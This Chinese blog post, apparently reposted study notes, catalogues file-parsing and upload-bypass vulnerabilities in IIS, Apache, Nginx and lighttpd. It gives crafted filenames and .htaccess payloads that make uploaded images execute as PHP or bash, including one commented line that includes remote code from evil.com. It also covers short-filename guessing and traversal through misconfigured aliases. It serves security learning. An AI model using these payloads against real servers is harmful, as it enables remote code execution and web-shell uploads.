<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="中间件文件解析漏洞"><meta name="keywords" content=""><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>中间件文件解析漏洞 | cyxin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '6.0.0'
} </script><meta name="generator" content="Hexo 6.0.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#IIS"><span class="toc-number">1.</span> <span class="toc-text">IIS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS-6-0"><span class="toc-number">1.1.</span> <span class="toc-text">IIS 6.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS-7-0-7-5-Nginx-lt-0-8-37"><span class="toc-number">1.2.</span> <span class="toc-text">IIS 7.0-7.5 &#x2F; Nginx &lt;&#x3D; 0.8.37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PUT%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">PUT漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E7%89%B9%E6%80%A7"><span class="toc-number">1.4.</span> <span class="toc-text">Windows特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E7%8C%9C%E8%A7%A3"><span class="toc-number">1.5.</span> <span class="toc-text">文件名猜解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache"><span class="toc-number">2.</span> <span class="toc-text">Apache</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">后缀解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess"><span class="toc-number">2.2.</span> <span class="toc-text">.htaccess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-15715"><span class="toc-number">2.3.</span> <span class="toc-text">CVE-2017-15715</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lighttpd"><span class="toc-number">2.4.</span> <span class="toc-text">lighttpd</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nginx"><span class="toc-number">3.</span> <span class="toc-text">Nginx</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fast-CGI%E5%85%B3%E9%97%AD"><span class="toc-number">3.1.</span> <span class="toc-text">Fast-CGI关闭</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fast-CGI%E5%BC%80%E5%90%AF"><span class="toc-number">3.2.</span> <span class="toc-text">Fast-CGI开启</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2013-4547"><span class="toc-number">3.3.</span> <span class="toc-text">CVE-2013-4547</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">3.4.</span> <span class="toc-text">配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">3.4.1.</span> <span class="toc-text">目录穿越</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">3.4.2.</span> <span class="toc-text">目录遍历</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">30</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">cyxin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">中间件文件解析漏洞</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-09</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>当一次搬运工</p>
<h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h2><blockquote>
<p>后缀解析 /xx.asp;.jpg 服务器默认不解析 ; 号及其后面的内容，相当于截断<br> 目录解析 /xx.asp/xx.jpg(xx.asp目录下任意解析)<br> 默认解析 xx.asa xx.cer xx.cdx<br> PROPFIND 栈溢出漏洞<br> RCE CVE-2017-7269</p>
</blockquote>
<h2 id="IIS-7-0-7-5-Nginx-lt-0-8-37"><a href="#IIS-7-0-7-5-Nginx-lt-0-8-37" class="headerlink" title="IIS 7.0-7.5 / Nginx &lt;= 0.8.37"></a>IIS 7.0-7.5 / Nginx &lt;= 0.8.37</h2><p>在Fast-CGI开启状态下，在文件路径后加上 /xx.php ，即 xx.jpg/xx.php 会被解析为php文件。</p>
<h2 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h2><p>开启WebDAV<br>拥有来宾用户，且来宾用户拥有上传权限<br>可任意文件上传</p>
<h2 id="Windows特性"><a href="#Windows特性" class="headerlink" title="Windows特性"></a>Windows特性</h2><p>Windows不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用 xx.php[空格] ， xx.php.， xx.php/， xx.php::$DATA 上传脚本文件。</p>
<h2 id="文件名猜解"><a href="#文件名猜解" class="headerlink" title="文件名猜解"></a>文件名猜解</h2><p>在支持NTFS 8.3文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：</p>
<p>文件名为原文件名前6位字符加上 ~1 ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。<br>后缀名不超过3位，超过部分会被截断<br>所有小写字母均转换成大写的字母<br>文件名后缀长度大于等于4或者总长度大于等于9时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件</p>
<p>IIS 8.0之前的版本支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种，需要安装ASP.NET。而IIS 8.0之后的版本只能通过OPTIONS和TRACE方法猜测成功，但是没有ASP.NET的限制。</p>
<p>这种方法的局限性在于：</p>
<p>文件夹名前6位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报<br>不支持中文文件名</p>
<p>这种方法可以通过命令 fsutil behavior set disable8dot3 1 关闭NTFS 8.3文件格式的支持来修复。</p>
<h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="后缀解析"><a href="#后缀解析" class="headerlink" title="后缀解析"></a>后缀解析</h2><p>test.php.x1.x2.x3 （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析</p>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>当 AllowOverride 被启用时，上传启用解析规则的.htaccess</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options ExecCGI</span><br><span class="line">AddHandler cgi-script .jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler fcgid-script .gif</span><br><span class="line">FcgidWrapper <span class="string">&quot;/bin/bash&quot;</span> .gif</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag allow_url_include <span class="number">1</span></span><br><span class="line">php_value auto_append_file data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span></span><br><span class="line"><span class="comment">#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</span></span><br><span class="line"><span class="comment">#php_value auto_append_file https://evil.com/evil-code.txt</span></span><br></pre></td></tr></table></figure>

<h2 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h2><p>%0A 绕过上传黑名单。<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1676145">Apache HTTPD换行解析漏洞</a></p>
<h2 id="lighttpd"><a href="#lighttpd" class="headerlink" title="lighttpd"></a>lighttpd</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx.jpg/xx.php</span><br></pre></td></tr></table></figure>

<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="Fast-CGI关闭"><a href="#Fast-CGI关闭" class="headerlink" title="Fast-CGI关闭"></a>Fast-CGI关闭</h2><p>在Fast-CGI关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径(xx.jpg)后面加上 %00.php ， 即 xx.jpg%00.php 会被当做 php 文件来解析<br>影响以下版本</p>
<blockquote>
<p>Nginx 0.5.*<br>Nginx 0.6.*<br>Nginx 0.7 &lt;= 0.7.65<br>Nginx 0.8 &lt;= 0.8.37</p>
</blockquote>
<h2 id="Fast-CGI开启"><a href="#Fast-CGI开启" class="headerlink" title="Fast-CGI开启"></a>Fast-CGI开启</h2><p>在Fast-CGI开启状态下，在文件路径后加上 /xx.php ，则 xx.jpg/xx.php 会被解析为php文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php的配置文件 php.ini 文件中开启了 cgi.fix_pathinfo</span><br><span class="line"></span><br><span class="line">/etc/php5/fpm/pool.d/www.conf中不正确的配置security.limit_extensions，导致允许将其他格式文件作为php解析执行</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2013-4547"><a href="#CVE-2013-4547" class="headerlink" title="CVE-2013-4547"></a>CVE-2013-4547</h2><p>影响nginx版本：nginx 0.8.41 ~ 1.5.6</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.jpg\x20\x00.php</span><br></pre></td></tr></table></figure>
<h2 id="配置错误"><a href="#配置错误" class="headerlink" title="配置错误"></a>配置错误</h2><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>如果配置中存在类似 location /foo { alias /bar/; } 的配置时，/foo../ 会被解析为 /bar/../ 从而导致目录穿越的发生。</p>
<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>配置中 autoindex on 开启时，Nginx中存在目录遍历漏洞。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/12444476.html">文件解析漏洞总结</a><br><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/01/14/%E4%B8%AD%E9%97%B4%E4%BB%B6/">大佬博客</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/05/09/中间件文件解析漏洞/">http://example.com/2022/05/09/中间件文件解析漏洞/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2022/06/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0(%E4%B8%80%EF%BC%89/"><i class="fa fa-chevron-left">  </i><span>Java反序列化学习（一）</span></a></div><div class="next-post pull-right"><a href="/2022/05/09/thinkphp6%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0&amp;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%20%E5%88%86%E6%9E%90/"><span>thinkphp6框架学习&amp;反序列化&amp;任意写文件 分析</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>